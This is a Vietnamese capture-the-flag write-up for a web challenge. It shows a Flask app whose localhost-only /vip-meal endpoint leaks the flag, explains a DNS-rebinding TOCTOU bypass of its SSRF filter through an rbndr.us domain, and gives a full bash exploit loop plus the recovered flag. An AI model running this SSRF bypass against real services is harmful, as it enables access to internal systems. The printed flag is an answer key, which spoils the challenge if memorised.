# Simple food notifications

## Check fle source

Trong source có endpoint `/vip-meal`:

```python
FLAG = open("/flag").read().strip()

@app.route('/vip-meal')
def vip_meal():
    if request.remote_addr != "127.0.0.1":
        app.logger.warning(f"Your IP {request.remote_addr} is not whitelisted so see vip meals")
        return render_template('meal.html', message="You are not dressed appropriate to see even vip meals."), 401

    return render_template('meal.html', title="VIP Meal", message=f"Our chef cooked the beast meal for our vip customers, here is the flag {FLAG} with some caviar on top."), 200
```

Endpoint này chỉ trả flag nếu request đến từ:

```text
127.0.0.1
```

Nếu truy cập trực tiếp từ bên ngoài thì bị từ chối. Vì vậy mục tiêu là dùng SSRF để bắt server tự request tới:

```text
http://127.0.0.1/vip-meal
```

## Bộ lọc SSRF

Ứng dụng có filter chống SSRF. Trước khi fetch URL, server lấy hostname ra, resolve bằng `socket.getaddrinfo()`, rồi check IP:

```python
addresses = socket.getaddrinfo(urllib3.util.parse_url(url).host, 80)

for addr in addresses:
    if not ipaddress.ip_address(addr[4][0]).is_global:
        notifications[id] = {
            "status": "REJECTED",
            "message": "Only staff is allowed to see mess in the kitchen..."
        }
        return
```

Do đó các payload đơn giản đều bị chặn:

```text
http://127.0.0.1/vip-meal
http://localhost/vip-meal
http://2130706433/vip-meal
http://0x7f000001/vip-meal
```

Lý do là các địa chỉ này đều resolve về IP không phải global.

## Ý tưởng bypass

Điểm yếu nằm ở TOCTOU giữa bước check và bước request thật.

Server resolve hostname một lần để kiểm tra:

```text
socket.getaddrinfo(host)
```

Sau đó `urllib3` lại tự resolve hostname thêm lần nữa khi thực hiện request:

```python
urllib3.request('GET', url, redirect=False, timeout=urllib3.Timeout(30))
```

Tức là hostname được resolve ít nhất 2 lần:

```text
Resolution #1: dùng để check is_global
Resolution #2: dùng để connect thật
```

Nếu làm DNS rebinding để lần đầu trả về IP global, filter sẽ pass. Sau đó lần request thật hoặc retry trả về `127.0.0.1`, server sẽ tự connect vào localhost và lấy được flag.

## DNS rebinding với rbndr.us

Dùng domain:

```text
7f000001.08080808.rbndr.us
```

Trong đó:

```text
7f000001 = 127.0.0.1
08080808 = 8.8.8.8
```

Domain này sẽ random trả về một trong hai IP:

```text
127.0.0.1
8.8.8.8
```

Payload SSRF:

```text
http://7f000001.08080808.rbndr.us/vip-meal
```

Nếu lần check đầu tiên resolve ra `127.0.0.1`, request sẽ bị reject.

Nếu lần check đầu tiên resolve ra `8.8.8.8`, filter sẽ pass vì `8.8.8.8` là global IP. Sau đó kết nối tới `8.8.8.8:80` bị timeout. Khi `urllib3` retry, nó resolve lại domain. Nếu lần này domain trả về `127.0.0.1`, request sẽ đi tới:

```text
http://127.0.0.1/vip-meal
```

Khi đó `request.remote_addr == "127.0.0.1"` và endpoint `/vip-meal` trả flag.

---

## Exploit script

```bash
#!/bin/bash

B="https://steamed-pineapple-crusted-with-candied-noodles-etjs.gpn24.ctf.kitctf.de"
URL="http://7f000001.08080808.rbndr.us/vip-meal"

for round in $(seq 1 20); do
  echo "[*] Round $round"

  while :; do
    resp=$(curl -s -X POST "$B/order" \
      --data-urlencode "url=$URL" \
      -d "meal=Gulasch")

    echo "$resp"

    id=$(echo "$resp" | grep -oP '/notification/\K[a-z0-9]+')

    if [ -n "$id" ]; then
      break
    fi

    w=$(echo "$resp" | grep -oP 'at least \K[0-9]+')
    if [ -n "$w" ]; then
      echo "[*] Rate limited, sleeping $((w + 2)) seconds..."
      sleep $((w + 2))
    else
      echo "[!] Could not get id, retrying in 5s..."
      sleep 5
    fi
  done

  echo "[*] Notification id: $id"

  for i in $(seq 1 90); do
    r=$(curl -s "$B/notification/$id")
    echo "$r"

    flag=$(echo "$r" | grep -oiE 'GPNCTF\{[^}]+\}')
    if [ -n "$flag" ]; then
      echo "[+] FLAG: $flag"
      exit 0
    fi

    st=$(echo "$r" | grep -oP '"status":\s*"\K[^"]+')

    if [ "$st" = "REJECTED" ] || [ "$st" = "FAILED" ]; then
      echo "[!] $st, retrying new order..."
      break
    fi

    sleep 2
  done
done
```

Chạy script:

```bash
chmod +x solve.sh
./solve.sh
```

## Kết quả

Một số round đầu có thể bị reject, kết quả cuối cùng:

```html
{"id": "usid5g4vve", "message": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>VIP Meal</title>\n    <link rel=\"stylesheet\" href=\"/static/css/style.css\">\n</head>\n<body>\n    <header>\n        <h1>VIP Meal</h1>\n    </header>\n    <main>\n        <p>Our chef cooked the beast meal for our vip customers, here is the flag GPNCTF{whY_M4K3_It_cOmplEx_WH3n_YOU_C4N_m4KE_i7_SImpL3} with some caviar on top.</p>\n        <a href=\"/\">Back to Home</a>\n    </main>\n</body>\n</html>", "status": "DONE"}
```

## Flag

```text
GPNCTF{whY_M4K3_It_cOmplEx_WH3n_YOU_C4N_m4KE_i7_SImpL3}
```